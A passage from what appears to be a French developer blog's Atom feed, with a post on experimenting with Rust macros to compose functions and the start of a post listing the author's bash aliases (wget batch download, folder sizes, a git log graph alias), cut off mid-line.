+&lt;p&gt;&lt;em&gt;Cela vaut aussi pour n'importe quoi d'autre que vous jugez utile de rajouter dans l'article&lt;/em&gt;&lt;/p&gt;</content><category term="python"></category></entry><entry><title>Rust: découverte</title><link href="http://blog.devsda.fr/10-min-rust.html" rel="alternate"></link><published>2016-03-27T22:20:00+02:00</published><updated>2016-03-27T22:20:00+02:00</updated><author><name>devsda</name></author><id>tag:blog.devsda.fr,2016-03-27:/10-min-rust.html</id><summary type="html">&lt;p&gt;Premières sensations avec Rust&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="http://fauxhead.deviantart.com/art/Rust-Bucket-393005936"&gt;&lt;em&gt;(illustration)&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Je viens de passer deux heures sur la doc de Rustlang.&lt;/p&gt;
+&lt;p&gt;Et je peux dorénavant marmonner que cette techno semble déchirer. Je vais mettre les lisps de côté quelque temps et m'y pencher de plus près.&lt;/p&gt;
+&lt;p&gt;Les &lt;em&gt;features&lt;/em&gt; intéressantes y sont très nombreuses.
+En plus des bénéfices de la compilation et du typage,
+Rust débarque avec plein de fonctionnalités assez attractives.&lt;/p&gt;
+&lt;p&gt;Et ... y'a des macros dedans&lt;/p&gt;
+&lt;p&gt;Si vous êtes familiers avec les systèmes de macros des lisps, vous comprendrez aisément l'intérêt des macros.
+Sinon, oubliez les substitutions de texte des macros en C: les macros dans Rust permettent d'étendre la syntaxe du langage. Les règles qui les régissent &lt;a href="https://doc.rust-lang.org/book/macros.html#matching"&gt;sont donc plus exigeantes&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;En pratique&lt;/h2&gt;
+&lt;p&gt;En découvrant ça, j'ai voulu tester. La première idée qui m'est venu à l'esprit, c'est une macro permettant de composer des fonctions. Concrètement, ça n'a pas forcément vocation à être implémenté en macro, mais pour l'exemple, ça suffira.&lt;/p&gt;
+&lt;h2&gt;1er jet&lt;/h2&gt;
+&lt;p&gt;J'ai implémenté naïvement ça en utilisant des fonctions anonymes.
+Ce n'est surement pas idiomatique ni optimisé, mais ça marche.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;macro_rules&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;compose&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="cp"&gt;$a&lt;/span&gt;:&lt;span class="nc"&gt;expr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cp"&gt;$b&lt;/span&gt;:&lt;span class="nc"&gt;expr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cp"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="cp"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;))));&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Vulgairement, &lt;code&gt;macro_rules!&lt;/code&gt; permet de déclarer une macro.
+Le lexème qui le suit, &lt;code&gt;compose&lt;/code&gt;, désigne le nom de la macro. Et ce qui suit entre &lt;code&gt;{&lt;/code&gt; et &lt;code&gt;}&lt;/code&gt;, c'est une expression de &lt;em&gt;pattern matching&lt;/em&gt; appliquée au "arguments" de la macro, qui peuvent être de toutes sortes (d'après &lt;a href="https://doc.rust-lang.org/book/macros.html#syntactic-requirements"&gt;la doc&lt;/a&gt;)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nv"&gt;ident&lt;/span&gt;: &lt;span class="nv"&gt;an&lt;/span&gt; &lt;span class="nv"&gt;identifier&lt;/span&gt;. &lt;span class="nv"&gt;Examples&lt;/span&gt;: &lt;span class="nv"&gt;x&lt;/span&gt;&lt;span class="c1"&gt;; foo.&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;: &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;qualified&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;. &lt;span class="nv"&gt;Example&lt;/span&gt;: &lt;span class="nv"&gt;T&lt;/span&gt;::&lt;span class="nv"&gt;SpecialA&lt;/span&gt;.
+&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nv"&gt;expr&lt;/span&gt;: &lt;span class="nv"&gt;an&lt;/span&gt; &lt;span class="nv"&gt;expression&lt;/span&gt;. &lt;span class="nv"&gt;Examples&lt;/span&gt;: &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;; if true { 1 } else { 2 }; f(42).&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nv"&gt;ty&lt;/span&gt;: &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;type&lt;/span&gt;. &lt;span class="nv"&gt;Examples&lt;/span&gt;: &lt;span class="nv"&gt;i32&lt;/span&gt;&lt;span class="c1"&gt;; Vec&amp;lt;(char, String)&amp;gt;; &amp;amp;T.&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nv"&gt;pat&lt;/span&gt;: &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;pattern&lt;/span&gt;. &lt;span class="nv"&gt;Examples&lt;/span&gt;: &lt;span class="nv"&gt;Some&lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;t&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;; (17, &amp;#39;a&amp;#39;); _.&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nv"&gt;stmt&lt;/span&gt;: &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;single&lt;/span&gt; &lt;span class="nv"&gt;statement&lt;/span&gt;. &lt;span class="nv"&gt;Example&lt;/span&gt;: &lt;span class="nv"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;.
+&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nv"&gt;block&lt;/span&gt;: &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;brace&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;delimited&lt;/span&gt; &lt;span class="nv"&gt;sequence&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt; &lt;span class="nv"&gt;statements&lt;/span&gt;. &lt;span class="nv"&gt;Example&lt;/span&gt;: { &lt;span class="nv"&gt;log&lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;error&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;hi&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;; return 12; }.&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nv"&gt;item&lt;/span&gt;: &lt;span class="nv"&gt;an&lt;/span&gt; &lt;span class="nv"&gt;item&lt;/span&gt;. &lt;span class="nv"&gt;Examples&lt;/span&gt;: &lt;span class="nv"&gt;fn&lt;/span&gt; &lt;span class="nv"&gt;foo&lt;/span&gt;&lt;span class="ss"&gt;()&lt;/span&gt; { }&lt;span class="c1"&gt;; struct Bar;.&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nv"&gt;meta&lt;/span&gt;: &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;meta item&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;, &lt;span class="nv"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;found&lt;/span&gt; &lt;span class="nv"&gt;in&lt;/span&gt; &lt;span class="nv"&gt;attributes&lt;/span&gt;. &lt;span class="nv"&gt;Example&lt;/span&gt;: &lt;span class="nv"&gt;cfg&lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;target_os&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;windows&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;.
+&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nv"&gt;tt&lt;/span&gt;: &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;single&lt;/span&gt; &lt;span class="nv"&gt;token&lt;/span&gt; &lt;span class="nv"&gt;tree&lt;/span&gt;.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Revenons à &lt;code&gt;compose&lt;/code&gt;. Effectivement, ça fonctionne :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;:&lt;span class="kt"&gt;u32&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;:&lt;span class="kt"&gt;u32&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;compose&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;h(4)={}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ rustc utils.rs &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./utils
+$ h&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;À première vue, ça marche, comme &lt;code&gt;((4 + 1) + 5) = 10&lt;/code&gt; Et si on regardait à quoi ressemblait la macro après expansion ?
+Par exemple, Clojure permet de voir à quoi ressemble une macro après expansion avec la macro &lt;code&gt;macroexpand&lt;/code&gt;. Rust étant un langage compilé, c'est vers le compilateur qu'il faut se tourner :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rustc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;unstable&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;pretty&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;expanded&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;utils&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rs&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;[...]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+
+&lt;span class="k"&gt;fn&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;: &lt;span class="kt"&gt;u32&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;: &lt;span class="kt"&gt;u32&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;[...]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;La déclaration ci-dessous nous intéresse plus particulièrement :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;c'est donc plus ou moins ce qu'on voulait, avec la vérification des types en prime.
+En effet, si on déclare la fonction g tel que &lt;code&gt;let g = |x:u64|(x + 5.5);&lt;/code&gt;, le compilateur
+nous explique calmement que :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;mismatched&lt;/span&gt; &lt;span class="n"&gt;types&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+ &lt;span class="n"&gt;expected&lt;/span&gt; &lt;span class="ss"&gt;`u32`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;found&lt;/span&gt; &lt;span class="ss"&gt;`u64`&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;E0308&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="p"&gt;[...]&lt;/span&gt; &lt;span class="n"&gt;note&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt; &lt;span class="n"&gt;expansion&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;compose&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr&gt;
+&lt;p&gt;Puis je me suis demandé si je pouvais rajouter la gestion d'un nombre variable de fonctions en arguments (je ne connais pas très bien Rust)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;macro_rules&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;compose&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;// 2 elements case&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="cp"&gt;$a&lt;/span&gt;:&lt;span class="nc"&gt;expr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cp"&gt;$b&lt;/span&gt;:&lt;span class="nc"&gt;expr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cp"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="cp"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;))));&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;// more !&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="cp"&gt;$x&lt;/span&gt;:&lt;span class="nc"&gt;expr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cp"&gt;$(,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cp"&gt;$more&lt;/span&gt;:&lt;span class="nc"&gt;expr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;compose&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;compose&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cp"&gt;$(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cp"&gt;$more&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cp"&gt;$x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Je me suis arrêté ici. Je voulais que ça &lt;em&gt;matche&lt;/em&gt; sur un élement de type &lt;code&gt;ident&lt;/code&gt;,
+ et non &lt;code&gt;expr&lt;/code&gt;, mais je n'y suis pas parvenu rapidement. C'est probablement dû au fait
+ que j'essaye les macros avant même la base du langage...&lt;/p&gt;
+&lt;p&gt;En résumé, malgrès une faible adoption (même si &lt;a href="http://www.zdnet.com/article/mozilla-begins-process-of-letting-firefox-rust/"&gt;Firefox arrive avec du Rust dedans en août&lt;/a&gt;) et assez peu de &lt;em&gt;hype&lt;/em&gt; autour du projet, je pense que Rust peut trouver sa place. J'y trouve plusieurs idées intéressantes.&lt;/p&gt;</content><category term="rust"></category></entry><entry><title>Les alias cools de bibi</title><link href="http://blog.devsda.fr/alias.html" rel="alternate"></link><published>2016-02-19T22:49:41+01:00</published><updated>2016-02-19T22:49:41+01:00</updated><author><name>devsda</name></author><id>tag:blog.devsda.fr,2016-02-19:/alias.html</id><summary type="html">&lt;p&gt;Mes alias bash&lt;/p&gt;</summary><content type="html">&lt;h3&gt;Télécharger par lots&lt;/h3&gt;
+&lt;p&gt;J'utilise cet alias pour récupérer des fichier par lots sur un serveur http. En général, c'est pour récupérer le contenu des torrents téléchargés à l'aide de ma seedbox &lt;em&gt;(boooouuh)&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="nv"&gt;dl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;wget  --user [user] --password [pass] -r --no-parent  --reject=&amp;quot;index.html*&amp;quot;&amp;#39;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Lister les dossiers les plus volumineux&lt;/h3&gt;
+&lt;p&gt;Celui-là, je l'utilise quand je blinde trop mon disque dur. J'ai qu'un SSD de taille modérée sur mon laptop, et ça peut aider pour faire le ménage.
+Cette commande liste les répertoires les plus obèses dans mon répertoire personnel (&lt;em&gt;/home/thomas/&lt;/em&gt;). Très pratique.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="nv"&gt;dirsizes&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;du -h --max-depth=1 /home/thomas/ | sort -h&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;git ultra-kikoo-graph&lt;/h3&gt;
+&lt;p&gt;C'est un collègue qui me la filé, tel quel. C'est une sorte de super pretty-print pour &lt;code&gt;git log --graph&lt;/code&gt;. Ce mec était un fada de git, et j'ai appris pas mal de trucs sur le sujet à ses côtés :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="nv"&gt;lg&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;git log --color --graph --pretty=format:&amp;#39;%Cred%h%Creset&lt;/span&gt;
